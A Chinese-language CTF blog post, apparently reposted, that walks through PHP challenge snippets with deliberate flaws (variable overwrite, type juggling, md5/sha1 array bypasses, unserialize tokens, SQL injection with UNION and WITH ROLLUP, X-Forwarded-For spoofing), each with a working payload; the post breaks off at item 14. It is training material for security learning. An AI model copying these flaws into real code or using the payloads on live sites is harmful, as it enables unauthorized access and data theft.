@@ -1,0 +1,971 @@
+<!DOCTYPE html>
+<html>
+
+<head><meta name="generator" content="Hexo 3.9.0">
+  
+  <title>CTF中一些PHP问题小结 - Scorpio</title>
+  <meta charset="UTF-8">
+  <meta name="description" content="每个人都应该拥有自己的梦想">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  
+  
+
+  <link rel="shortcut icon" href="/favicon.ico" type="image/png">
+  <meta name="description" content="总算是在网上找到了一篇比较全的有关php问题在CTF中的运用与绕过，记录一下来自https://hackfun.org/  Orz">
+<meta name="keywords" content="CTF,PHP">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CTF中一些PHP问题小结">
+<meta property="og:url" content="https://www.Gsuhy.cn/2018/03/18/CTF中一些PHP问题小结/index.html">
+<meta property="og:site_name" content="Scorpio">
+<meta property="og:description" content="总算是在网上找到了一篇比较全的有关php问题在CTF中的运用与绕过，记录一下来自https://hackfun.org/  Orz">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://www.gsuhy.cn/img/1521205930348.png">
+<meta property="og:updated_time" content="2019-08-27T07:05:46.454Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="CTF中一些PHP问题小结">
+<meta name="twitter:description" content="总算是在网上找到了一篇比较全的有关php问题在CTF中的运用与绕过，记录一下来自https://hackfun.org/  Orz">
+<meta name="twitter:image" content="https://www.gsuhy.cn/img/1521205930348.png">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/mdui@0.4.3/dist/css/mdui.min.css">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.15.8/styles/atom-one-dark.css">
+   
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css">
+  
+  
+  <link rel="stylesheet" href="//at.alicdn.com/t/font_1038733_0xvrvpg9c0r.css">
+  <link rel="stylesheet" href="/css/style.css?v=1566894167608">
+<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
+
+<body class="mdui-drawer-body-left">
+  
+  <div id="nexmoe-background">
+    <div class="nexmoe-bg" style="background-image: url(https://i.loli.net/2019/01/13/5c3aec85a4343.jpg)"></div>
+    <div class="mdui-appbar mdui-shadow-0">
+      <div class="mdui-toolbar">
+        <a mdui-drawer="{target: '#drawer', swipe: true}" title="menu" class="mdui-btn mdui-btn-icon"><i class="mdui-icon material-icons">menu</i></a>
+        <div class="mdui-toolbar-spacer"></div>
+        <!--<a href="javascript:;" class="mdui-btn mdui-btn-icon"><i class="mdui-icon material-icons">search</i></a>-->
+        <a href="/" title="Gsuhy" class="mdui-btn mdui-btn-icon"><img src="/images/avatar.png"></a>
+       </div>
+    </div>
+  </div>
+  <div id="nexmoe-header">
+      <div class="nexmoe-drawer mdui-drawer" id="drawer">
+    <div class="nexmoe-avatar mdui-ripple">
+        <a href="/" title="Gsuhy">
+            <img src="/images/avatar.png" alt="Gsuhy">
+        </a>
+    </div>
+    <div class="nexmoe-count">
+        <div><span>文章</span>30</div>
+        <div><span>标签</span>15</div>
+        <div><span>分类</span>13</div>
+    </div>
+    <ul class="nexmoe-list mdui-list" mdui-collapse="{accordion: true}">
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple" href="/" title="回到首页">
+            <i class="mdui-list-item-icon nexmoefont icon-home"></i>
+            <div class="mdui-list-item-content">
+                回到首页
+            </div>
+        </a>
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple" href="/about.html" title="关于博客">
+            <i class="mdui-list-item-icon nexmoefont icon-info-circle"></i>
+            <div class="mdui-list-item-content">
+                关于博客
+            </div>
+        </a>
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple" href="/PY.html" title="我的朋友">
+            <i class="mdui-list-item-icon nexmoefont icon-unorderedlist"></i>
+            <div class="mdui-list-item-content">
+                我的朋友
+            </div>
+        </a>
+        
+    </ul>
+    <aside id="nexmoe-sidebar">
+  
+  <div class="nexmoe-widget-wrap">
+    <h3 class="nexmoe-widget-title">社交按钮</h3>
+    <div class="nexmoe-widget nexmoe-social">
+        <a class="mdui-ripple" href="https://space.bilibili.com/20238211" target="_blank" mdui-tooltip="{content: '哔哩哔哩'}" style="color: rgb(231, 106, 141);background-color: rgba(231, 106, 141, .15);">
+            <i class="nexmoefont icon-bilibili"></i>
+        </a><a class="mdui-ripple" href="https://github.com/nexmoe/" target="_blank" mdui-tooltip="{content: 'GitHub'}" style="color: rgb(25, 23, 23);background-color: rgba(25, 23, 23, .15);">
+            <i class="nexmoefont icon-github"></i>
+        </a>
+    </div>
+</div>
+  
+  
+  <div class="nexmoe-widget-wrap">
+    <h3 class="nexmoe-widget-title">文章分类</h3>
+    <div class="nexmoe-widget">
+
+      <ul class="category-list">
+
+        
+
+
+        
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/CTF/">CTF</a>
+          <span class="category-list-count">2</span>
+        </li>
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/JAVA/">JAVA</a>
+          <span class="category-list-count">1</span>
+        </li>
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/JSP/">JSP</a>
+          <span class="category-list-count">1</span>
+        </li>
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/Link/">Link</a>
+          <span class="category-list-count">1</span>
+        </li>
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/Linux/">Linux</a>
+          <span class="category-list-count">1</span>
+        </li>
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/Nginx/">Nginx</a>
+          <span class="category-list-count">2</span>
+        </li>
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/PHP/">PHP</a>
+          <span class="category-list-count">4</span>
+        </li>
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/Python/">Python</a>
+          <span class="category-list-count">11</span>
+        </li>
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/SQL/">SQL</a>
+          <span class="category-list-count">3</span>
+        </li>
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/内网渗透/">内网渗透</a>
+          <span class="category-list-count">1</span>
+        </li>
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/前端/">前端</a>
+          <span class="category-list-count">1</span>
+        </li>
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/学习/">学习</a>
+          <span class="category-list-count">1</span>
+        </li>
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/生活/">生活</a>
+          <span class="category-list-count">1</span>
+        </li>
+
+        
+      </ul>
+
+    </div>
+  </div>
+
+
+  
+  
+  <div class="nexmoe-widget-wrap">
+    <h3 class="nexmoe-widget-title">标签云</h3>
+    <div id="randomtagcloud" class="nexmoe-widget tagcloud">
+      <a href="/tags/CTF/" style="font-size: 12.5px;">CTF</a> <a href="/tags/JavaScript/" style="font-size: 10px;">JavaScript</a> <a href="/tags/Nginx/" style="font-size: 12.5px;">Nginx</a> <a href="/tags/PHP/" style="font-size: 17.5px;">PHP</a> <a href="/tags/WP/" style="font-size: 10px;">WP</a> <a href="/tags/jSP/" style="font-size: 10px;">jSP</a> <a href="/tags/java/" style="font-size: 10px;">java</a> <a href="/tags/linux/" style="font-size: 10px;">linux</a> <a href="/tags/php/" style="font-size: 10px;">php</a> <a href="/tags/python/" style="font-size: 20px;">python</a> <a href="/tags/scrapy/" style="font-size: 10px;">scrapy</a> <a href="/tags/sites/" style="font-size: 10px;">sites</a> <a href="/tags/sql/" style="font-size: 15px;">sql</a> <a href="/tags/内网渗透/" style="font-size: 10px;">内网渗透</a> <a href="/tags/生活/" style="font-size: 10px;">生活</a>
+    </div>
+    
+  </div>
+
+  
+  
+  <div class="nexmoe-widget-wrap">
+    <h3 class="nexmoe-widget-title">文章归档</h3>
+    <div class="nexmoe-widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/08/">八月 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/07/">七月 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/04/">四月 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/03/">三月 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/02/">二月 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/10/">十月 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/04/">四月 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/03/">三月 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/02/">二月 2018</a></li></ul>
+    </div>
+  </div>
+
+
+  
+</aside>
+    <div class="nexmoe-copyright">
+        &copy; 2019 Gsuhy
+        Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+        & <a href="https://nexmoe.com/hexo-theme-nexmoe.html" target="_blank">Nexmoe</a>
+    </div>
+</div><!-- .nexmoe-drawer -->
+  </div>
+  <div id="nexmoe-content">
+    <div class="nexmoe-primary">
+        <div class="nexmoe-post">
+    <div class="nexmoe-post-cover"> 
+        
+            <img src="https://i.loli.net/2019/01/13/5c3aec85a4343.jpg">
+        
+        <h1>CTF中一些PHP问题小结</h1>
+    </div>
+  <div class="nexmoe-post-meta">
+    <a><i class="nexmoefont icon-calendar-fill"></i>2018年03月18日</a>
+    <a><i class="nexmoefont icon-areachart"></i>4.5k 字</a>
+    <a><i class="nexmoefont icon-time-circle-fill"></i>大概 24 分钟</a>
+    
+      <a class="nexmoefont icon-appstore-fill -link" href="/categories/CTF/">CTF</a>
+    
+    
+      <a class="nexmoefont icon-tag-fill -link" href="/tags/CTF/">CTF</a> <a class="nexmoefont icon-tag-fill -link" href="/tags/PHP/">PHP</a>
+    
+  </div>
+  <article>
+    <p>总算是在网上找到了一篇比较全的有关php问题在CTF中的运用与绕过，记录一下<br>来自<a href="https://hackfun.org/" target="_blank" rel="noopener">https://hackfun.org/</a>  Orz<a id="more"></a></p>
+<h2 id="CTF中一些PHP问题小结"><a href="#CTF中一些PHP问题小结" class="headerlink" title="CTF中一些PHP问题小结"></a>CTF中一些PHP问题小结</h2><h3 id="1-extract变量覆盖"><a href="#1-extract变量覆盖" class="headerlink" title="# 1  extract变量覆盖"></a># 1  extract变量覆盖</h3><p><strong>code</strong></p>
+<pre><code>&lt;?php
+$flag=&#39;xxx&#39;;
+extract($_GET);
+ if(isset($shiyan))
+ {
+    $content=trim(file_get_contents($flag));
+    if($shiyan==$content)
+    {
+        echo&#39;ctf{xxx}&#39;;
+    }
+   else
+   {
+    echo&#39;Oh.no&#39;;
+   }
+   }
+?&gt;</code></pre><h5 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h5><p><code>http://127.0.0.1/233.php?shiyan=&amp;flag=1</code><br><img src="/img/1521205930348.png" alt="Alt text"></p>
+<h3 id="2-绕过trim函数过滤"><a href="#2-绕过trim函数过滤" class="headerlink" title="# 2  绕过trim函数过滤"></a># 2  绕过trim函数过滤</h3><p><strong>code</strong></p>
+<pre><code>&lt;?php
+
+$info = &quot;&quot;;
+$req = [];
+$flag=&quot;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&quot;;
+
+ini_set(&quot;display_error&quot;, false); //为一个配置选项设置值
+error_reporting(0); //关闭所有PHP错误报告
+
+if(!isset($_GET[&#39;number&#39;])){
+   header(&quot;hint:26966dc52e85af40f59b4fe73d8c323a.txt&quot;); //HTTP头显示hint 26966dc52e85af40f59b4fe73d8c323a.txt
+
+   die(&quot;have a fun!!&quot;); //die — 等同于 exit()
+
+}
+
+foreach([$_GET, $_POST] as $global_var) {  //foreach 语法结构提供了遍历数组的简单方式
+    foreach($global_var as $key =&gt; $value) {
+        $value = trim($value);  //trim — 去除字符串首尾处的空白字符（或者其他字符）
+        is_string($value) &amp;&amp; $req[$key] = addslashes($value); // is_string — 检测变量是否是字符串，addslashes — 使用反斜线引用字符串
+    }
+}
+
+
+function is_palindrome_number($number) {
+    $number = strval($number); //strval — 获取变量的字符串值
+    $i = 0;
+    $j = strlen($number) - 1; //strlen — 获取字符串长度
+    while($i &lt; $j) {
+        if($number[$i] !== $number[$j]) {
+            return false;
+        }
+        $i++;
+        $j--;
+    }
+    return true;
+}
+
+
+if(is_numeric($_REQUEST[&#39;number&#39;])) //is_numeric — 检测变量是否为数字或数字字符串
+{
+
+   $info=&quot;sorry, you cann&#39;t input a number!&quot;;
+
+}
+elseif($req[&#39;number&#39;]!=strval(intval($req[&#39;number&#39;]))) //intval — 获取变量的整数值
+{
+
+     $info = &quot;number must be equal to it&#39;s integer!! &quot;;  
+
+}
+else
+{
+
+     $value1 = intval($req[&quot;number&quot;]);
+     $value2 = intval(strrev($req[&quot;number&quot;]));  
+
+     if($value1!=$value2){
+          $info=&quot;no, this is not a palindrome number!&quot;;
+     }
+     else
+     {
+
+          if(is_palindrome_number($req[&quot;number&quot;])){
+              $info = &quot;nice! {$value1} is a palindrome number!&quot;;
+          }
+          else
+          {
+             $info=$flag;
+          }
+     }
+
+}
+
+echo $info;
+?&gt;</code></pre><p>这段代码中，由于<code>is_numeric</code>没有检测<code>\0(%00)</code>，所以导致其中<code>is_numeric($_REQUEST[&#39;number&#39;])</code>为false，成功跳过检测。由于trim函数没有过滤<code>\f(%0c)</code>，而intval函数跳过<code>\f(%0c)</code>，导致<code>$value1</code>和<code>$value2</code>相等，进入到<code>is_palindrome_number</code>函数成功通过<code>$number[$i] != $number[$j]</code>检测返回false，最终进入到获取<code>$flag</code>的<code>else</code>里。</p>
+<h5 id="payload-1"><a href="#payload-1" class="headerlink" title="payload"></a>payload</h5><p><code>?number=%0c123</code></p>
+<h3 id="3-多重加密"><a href="#3-多重加密" class="headerlink" title="# 3 多重加密"></a># 3 多重加密</h3><p><strong>code</strong></p>
+<pre><code>&lt;?php
+    include &#39;common.php&#39;;
+    $requset = array_merge($_GET, $_POST, $_COOKIE);
+    //把一个或多个数组合并为一个数组
+    class db
+    {
+        public $where;
+        function __wakeup()
+        {
+            if(!empty($this-&gt;where))
+            {
+                $this-&gt;select($this-&gt;where);
+            }
+        }
+        function select($where)
+        {
+            $sql = mysql_query(&#39;select * from user where &#39;.$where);
+            //函数执行一条 MySQL 查询。
+            return @mysql_fetch_array($sql);
+            //从结果集中取得一行作为关联数组，或数字数组，或二者兼有返回根据从结果集取得的行生成的数组，如果没有更多行则返回 false
+        }
+    }
+    if(isset($requset[&#39;token&#39;]))
+    //测试变量是否已经配置。若变量已存在则返回 true 值。其它情形返回 false 值。
+    {
+        $login = unserialize(gzuncompress(base64_decode($requset[&#39;token&#39;])));
+        //gzuncompress:进行字符串压缩
+        //unserialize: 将已序列化的字符串还原回 PHP 的值
+        $db = new db();
+        $row = $db-&gt;select(&#39;user=\&#39;&#39;.mysql_real_escape_string($login[&#39;user&#39;]).&#39;\&#39;&#39;);
+        //mysql_real_escape_string() 函数转义 SQL 语句中使用的字符串中的特殊字符。
+        if($login[&#39;user&#39;] === &#39;ichunqiu&#39;)
+        {
+            echo $flag;
+        }else if($row[&#39;pass&#39;] !== $login[&#39;pass&#39;]){
+            echo &#39;unserialize injection!!&#39;;
+        }else{
+            echo &quot;(╯‵□′)╯︵┴─┴ &quot;;
+        }
+    }
+    // else{
+    //     header(&#39;Location: index.php?error=1&#39;);
+    // }
+?&gt;</code></pre><h5 id="payload-2"><a href="#payload-2" class="headerlink" title="payload"></a>payload</h5><pre><code>&lt;?php
+$arr = array([&#39;user&#39;] === &#39;ichunqiu&#39;);
+$token = base64_encode(gzcompress(serialize($arr)));
+print_r($token);
+?&gt;
+
+http://127.0.0.1/233.php?token=eJxLtDK0qs60MrBOAuJaAB5uBBQ=</code></pre><h3 id="4-sql注入-WITH-ROLLUP绕过"><a href="#4-sql注入-WITH-ROLLUP绕过" class="headerlink" title="# 4  sql注入 WITH ROLLUP绕过"></a># 4  sql注入 WITH ROLLUP绕过</h3><p><strong>code</strong></p>
+<pre><code>&lt;?php
+error_reporting(0);
+if (!isset($_POST[&#39;uname&#39;]) || !isset($_POST[&#39;pwd&#39;])) {
+    echo &#39;&lt;form action=&quot;&quot; method=&quot;post&quot;&gt;&#39;.&quot;&lt;br/&gt;&quot;;
+    echo &#39;&lt;input name=&quot;uname&quot; type=&quot;text&quot;/&gt;&#39;.&quot;&lt;br/&gt;&quot;;
+    echo &#39;&lt;input name=&quot;pwd&quot; type=&quot;text&quot;/&gt;&#39;.&quot;&lt;br/&gt;&quot;;
+    echo &#39;&lt;input type=&quot;submit&quot; /&gt;&#39;.&quot;&lt;br/&gt;&quot;;
+    echo &#39;&lt;/form&gt;&#39;.&quot;&lt;br/&gt;&quot;;
+    echo &#39;&lt;!--source: source.txt--&gt;&#39;.&quot;&lt;br/&gt;&quot;;
+    die;
+}
+function AttackFilter($StrKey,$StrValue,$ArrReq){  
+    if (is_array($StrValue)){
+//检测变量是否是数组
+        $StrValue=implode($StrValue);
+//返回由数组元素组合成的字符串
+    }
+    if (preg_match(&quot;/&quot;.$ArrReq.&quot;/is&quot;,$StrValue)==1){   
+//匹配成功一次后就会停止匹配
+        print &quot;水可载舟，亦可赛艇！&quot;;
+        exit();
+    }
+}
+$filter = &quot;and|select|from|where|union|join|sleep|benchmark|,|\(|\)&quot;;
+foreach($_POST as $key=&gt;$value){
+//遍历数组
+    AttackFilter($key,$value,$filter);
+}
+$con = mysql_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;root&quot;);
+if (!$con){
+    die(&#39;Could not connect: &#39; . mysql_error());
+}
+$db=&quot;test&quot;;
+mysql_select_db($db, $con);
+//设置活动的 MySQL 数据库
+$sql=&quot;SELECT * FROM interest WHERE uname = &#39;{$_POST[&#39;uname&#39;]}&#39;&quot;;
+echo $sql;
+echo &quot;&lt;/br&gt;&quot;;
+$query = mysql_query($sql);
+//执行一条 MySQL 查询
+var_dump(mysql_num_rows($query));
+echo &quot;&lt;/br&gt;&quot;;
+if (mysql_num_rows($query) == 1) {
+//返回结果集中行的数目
+    $key = mysql_fetch_array($query);
+//返回根据从结果集取得的行生成的数组，如果没有更多行则返回 false
+    if($key[&#39;pwd&#39;] == $_POST[&#39;pwd&#39;]) {
+        print &quot;CTF{XXXXXX}&quot;;
+    }else{
+        print &quot;亦可赛艇！&quot;;
+    }
+}else{
+    print &quot;一颗赛艇！&quot;;
+}
+mysql_close($con);
+?&gt;</code></pre><h5 id="payload-3"><a href="#payload-3" class="headerlink" title="payload"></a>payload</h5><p><code>pwd&amp;uname=admin&#39; group by pwd with rollup limit 1 offset 1#--</code></p>
+<h3 id="5-ereg正则-00截断"><a href="#5-ereg正则-00截断" class="headerlink" title="# 5  ereg正则%00截断"></a># 5  ereg正则%00截断</h3><p><strong>code</strong></p>
+<pre><code>&lt;?php
+$flag = &quot;flag&quot;;
+if (isset ($_GET[&#39;password&#39;]))
+{
+  if (ereg (&quot;^[a-zA-Z0-9]+$&quot;, $_GET[&#39;password&#39;]) === FALSE)
+  {
+    echo &#39;&lt;p&gt;You password must be alphanumeric&lt;/p&gt;&#39;;
+  }
+  else if (strlen($_GET[&#39;password&#39;]) &lt; 8 &amp;&amp; $_GET[&#39;password&#39;] &gt; 9999999)
+   {
+     if (strpos ($_GET[&#39;password&#39;], &#39;*-*&#39;) !== FALSE) //strpos — 查找字符串首次出现的位置
+      {
+      die(&#39;Flag: &#39; . $flag);
+      }
+      else
+      {
+        echo(&#39;&lt;p&gt;*-* have not been found&lt;/p&gt;&#39;);
+       }
+      }
+     else
+     {
+        echo &#39;&lt;p&gt;Invalid password&lt;/p&gt;&#39;;
+      }
+   }
+?&gt;</code></pre><p>ereg是处理字符串，传入数组后就返回NULL</p>
+<h5 id="payload-4"><a href="#payload-4" class="headerlink" title="payload"></a>payload</h5><p><code>?password=1e9%00*-*</code></p>
+<h3 id="6-strcmp比较字符串"><a href="#6-strcmp比较字符串" class="headerlink" title="# 6 strcmp比较字符串"></a># 6 strcmp比较字符串</h3><p>这个以前有写过，就不多废话了</p>
+<h3 id="7-sha1-函数比较绕过"><a href="#7-sha1-函数比较绕过" class="headerlink" title="# 7 sha1()函数比较绕过"></a># 7 sha1()函数比较绕过</h3><p>先说一下sha1()函数吧。<br>sha1-计算字符串的sha1散列值<br><code>string sha1 ( string $str [, bool $raw_output = false ] )</code></p>
+<h4 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h4><h5 id="str"><a href="#str" class="headerlink" title="str"></a>str</h5><p>输入字符串</p>
+<h5 id="raw-output"><a href="#raw-output" class="headerlink" title="raw_output"></a>raw_output</h5><p>如果可选的 raw_output 参数被设置为 TRUE， 那么 sha1 摘要将以 20 字符长度的原始格式返回， 否则返回值是一个 40 字符长度的十六进制数字。<br><strong>利用<a href="http://www.faqs.org/rfcs/rfc3174.html" target="_blank" rel="noopener">美国安全散列算法1</a>计算字符串的sha1散列值</strong><br><strong>code</strong></p>
+<pre><code>&lt;?php
+$flag = &quot;flag&quot;;
+if (isset($_GET[&#39;name&#39;]) and isset($_GET[&#39;password&#39;]))
+{
+    var_dump($_GET[&#39;name&#39;]);
+    echo &quot;&lt;/br&gt;&quot;;
+    var_dump($_GET[&#39;password&#39;]);
+    var_dump(sha1($_GET[&#39;name&#39;]));
+    var_dump(sha1($_GET[&#39;password&#39;]));
+    if ($_GET[&#39;name&#39;] == $_GET[&#39;password&#39;])
+        echo &#39;&lt;p&gt;Your password can not be your name!&lt;/p&gt;&#39;;
+    else if (sha1($_GET[&#39;name&#39;]) === sha1($_GET[&#39;password&#39;]))
+      die(&#39;Flag: &#39;.$flag);
+    else
+        echo &#39;&lt;p&gt;Invalid password.&lt;/p&gt;&#39;;
+}
+else
+    echo &#39;&lt;p&gt;Login first!&lt;/p&gt;&#39;;
+?&gt;</code></pre><p>由于<code>sha1()</code>函数和<code>md5()</code>函数在处理传入参数为数组时会报警并且返回NULL，所以构造两个不同数组传进去就可以绕过<code>if ($_GET[&#39;name&#39;]=$_GET[&#39;password&#39;])</code>和<code>else if (sha1($_GET[&#39;name&#39;])==sha1($_GET[&#39;password&#39;]))</code></p>
+<p>#####payload<br><code>?name[]=1&amp;password[]=2</code><br>其实感觉跟md5是一样的emmmmmmm</p>
+<h3 id="8-SESSION验证绕过"><a href="#8-SESSION验证绕过" class="headerlink" title="# 8  SESSION验证绕过"></a># 8  SESSION验证绕过</h3><p><strong>code</strong></p>
+<pre><code>&lt;html&gt;  
+&lt;head&gt;  
+    &lt;title&gt;Get flag&lt;/title&gt;
+&lt;/head&gt;  
+&lt;body&gt;  
+
+&lt;?php  
+session_start();   
+
+require &#39;flag.php&#39;;  
+
+if (isset ($_GET[&#39;password&#39;])) {  
+    if ($_GET[&#39;password&#39;] == $_SESSION[&#39;password&#39;])  
+        die (&#39;Flag: &#39;.$flag);  
+    else  
+        print &#39;&lt;p class=&quot;alert&quot;&gt;Wrong guess.&lt;/p&gt;&#39;;  
+}  
+
+// Unpredictable seed  
+mt_srand((microtime() ^ rand(1, 10000)) % rand(1, 10000) + rand(1, 10000));  
+?&gt;  
+
+&lt;section class=&quot;login&quot;&gt;    
+        &lt;ul class=&quot;list&quot;&gt;  
+        &lt;?php  
+        for ($i=0; $i&lt;3; $i++)  
+            print &#39;&lt;li&gt;&#39; . mt_rand (0, 0xffffff) . &#39;&lt;/li&gt;&#39;;  
+        $_SESSION[&#39;password&#39;] = mt_rand (0, 0xffffff);  
+        ?&gt;  
+        &lt;/ul&gt;  
+
+        &lt;form method=&quot;get&quot;&gt;  
+                &lt;input type=&quot;text&quot; required name=&quot;password&quot; placeholder=&quot;Next number&quot; /&gt;&lt;br/&gt;  
+                &lt;input type=&quot;submit&quot;/&gt;  
+        &lt;/form&gt;  
+&lt;/section&gt;  
+&lt;/body&gt;  
+&lt;/html&gt;</code></pre><p><code>if ($_GET[&#39;password&#39;]=$_SESSION[&#39;password&#39;])</code>，可以手动删除请求时的cookie，让<code>$_SESSION[&#39;password&#39;]</code>字段为NULL，并且让传入的password参数为NULL</p>
+<h5 id="payload-5"><a href="#payload-5" class="headerlink" title="payload"></a>payload</h5><p><code>?password=</code></p>
+<h3 id="9-密码md5比较绕过"><a href="#9-密码md5比较绕过" class="headerlink" title="# 9 密码md5比较绕过"></a># 9 密码md5比较绕过</h3><p>跟一般md5有丶不同嗷<del>~</del><br><strong>code</strong></p>
+<pre><code>&lt;?php
+//配置数据库
+if($_POST[user] &amp;&amp; $_POST[pass]) {
+    $conn = mysql_connect(&quot;localhost&quot;, &quot;root&quot;, &quot;root&quot;);
+    mysql_select_db(&quot;test&quot;) or die(&quot;Could not select database&quot;);
+    if ($conn-&gt;connect_error) {
+        die(&quot;Connection failed: &quot; . mysql_error($conn));
+}
+//赋值
+$user = $_POST[user];
+$pass = md5($_POST[pass]);
+//sql语句
+$sql = &quot;select pwd from test where user=&#39;$user&#39;&quot;;
+$query = mysql_query($sql);
+if (!$query) {
+    printf(&quot;Error: %s\n&quot;, mysql_error($conn));
+    exit();
+}
+$row = mysql_fetch_array($query, MYSQL_ASSOC);
+  if (($row[pwd]) &amp;&amp; (!strcasecmp($pass, $row[pwd]))) {
+//如果 str1 小于 str2 返回 &lt; 0； 如果 str1 大于 str2 返回 &gt; 0；如果两者相等，返回 0。
+    echo &quot;&lt;p&gt;Logged in! Key:************** &lt;/p&gt;&quot;;
+}
+else {
+    echo(&quot;&lt;p&gt;Log in failure!&lt;/p&gt;&quot;);
+  }
+}
+?&gt;
+</code></pre><h5 id="payload-6"><a href="#payload-6" class="headerlink" title="payload"></a>payload</h5><p><code>?user=&#39; union select &#39;e10adc3949ba59abbe56e057f20f883e&#39; #&amp;pass=123456</code></p>
+<h3 id="10-urldecode-二次编码绕过"><a href="#10-urldecode-二次编码绕过" class="headerlink" title="# 10 urldecode 二次编码绕过"></a># 10 urldecode 二次编码绕过</h3><p>就是一个<code>urldecode()</code>函数，将参数进行二次编码就行，没啥好多说的</p>
+<h3 id="11-X-Forwarded-For-绕过IP"><a href="#11-X-Forwarded-For-绕过IP" class="headerlink" title="# 11 X-Forwarded-For 绕过IP"></a># 11 X-Forwarded-For 绕过IP</h3><p><strong>code</strong></p>
+<pre><code>&lt;?php
+function GetIP(){
+if(!empty($_SERVER[&quot;HTTP_CLIENT_IP&quot;]))
+    $cip = $_SERVER[&quot;HTTP_CLIENT_IP&quot;];
+else if(!empty($_SERVER[&quot;HTTP_X_FORWARDED_FOR&quot;]))
+    $cip = $_SERVER[&quot;HTTP_X_FORWARDED_FOR&quot;];
+else if(!empty($_SERVER[&quot;REMOTE_ADDR&quot;]))
+    $cip = $_SERVER[&quot;REMOTE_ADDR&quot;];
+else
+    $cip = &quot;0.0.0.0&quot;;
+return $cip;
+}
+$GetIPs = GetIP();
+if ($GetIPs==&quot;1.1.1.1&quot;){
+echo &quot;Great! Key is *********&quot;;
+}
+else{
+echo &quot;错误！你的IP不在访问列表之内！&quot;;
+}
+?&gt;</code></pre><h6 id="payload-7"><a href="#payload-7" class="headerlink" title="payload"></a>payload</h6><p>很简单，bp抓包，然后HTTP透添加<code>X-Forwarded-For:1.1.1.1</code></p>
+<h3 id="12-md5加密相等绕过"><a href="#12-md5加密相等绕过" class="headerlink" title="# 12 md5加密相等绕过"></a># 12 md5加密相等绕过</h3><p><strong>code</strong></p>
+<pre><code>&lt;?php
+$md51 = md5(&#39;QNKCDZO&#39;);
+$a = @$_GET[&#39;a&#39;];
+$md52 = @md5($a);
+if(isset($a)){
+if ($a != &#39;QNKCDZO&#39; &amp;&amp; $md51 == $md52) {
+    echo &quot;flag{*****************}&quot;;
+} else {
+    echo &quot;false!!!&quot;;
+}}
+else{echo &quot;please input a&quot;;}
+?&gt;</code></pre><p>又是PHP弱类型嘤嘤嘤<del>~</del>，随便找个<code>0exxx</code>的字符串就行</p>
+<h5 id="payload-8"><a href="#payload-8" class="headerlink" title="payload"></a>payload</h5><p><code>?a=240610708</code></p>
+<h3 id="13-intval函数向下取整"><a href="#13-intval函数向下取整" class="headerlink" title="# 13 intval函数向下取整"></a># 13 intval函数向下取整</h3><p><strong>code</strong></p>
+<pre><code>&lt;?php
+if($_GET[id]) {
+    $conn = mysql_connect(&quot;localhost&quot;, &quot;root&quot;, &quot;root&quot;);
+    mysql_select_db(&quot;test&quot;) or die(&quot;Could not select database&quot;);
+    if ($conn-&gt;connect_error) {
+      die(&quot;Connection failed: &quot; . mysql_error($conn));
+    }
+  $id = intval($_GET[id]);
+  echo $id;
+  $query = @mysql_fetch_array(mysql_query(&quot;select flag from ctf where id=&#39;$id&#39;&quot;));
+  echo $_GET[id];
+  if ($_GET[id]==1024) {
+    echo &quot;&lt;p&gt;no! try again&lt;/p&gt;&quot;;
+  }
+  else{
+    echo($query[flag]);
+  }
+}
+?&gt;</code></pre><p>记得以前CTF遇到过，具体在哪我给忘了，反正取一个大于1024，小于1025的小数就行</p>
+<h5 id="payload-9"><a href="#payload-9" class="headerlink" title="payload"></a>payload</h5><p><code>?id=1024.1</code></p>
+<h3 id="14-strpos数组绕过NULL与ereg正则-00截断"><a href="#14-strpos数组绕过NULL与ereg正则-00截断" class="headerlink" title="# 14 strpos数组绕过NULL与ereg正则%00截断"></a># 14 strpos数组绕过NULL与ereg正则%00截断</h3><p><strong>code</strong></p>
+<pre><code>&lt;?php
+$flag = &quot;flag&quot;;
+    if (isset ($_GET[&#39;nctf&#39;])) {
+        if (@ereg (&quot;^[1-9]+$&quot;, $_GET[&#39;nctf&#39;]) === FALSE)
+            echo &#39;必须输入数字才行&#39;;
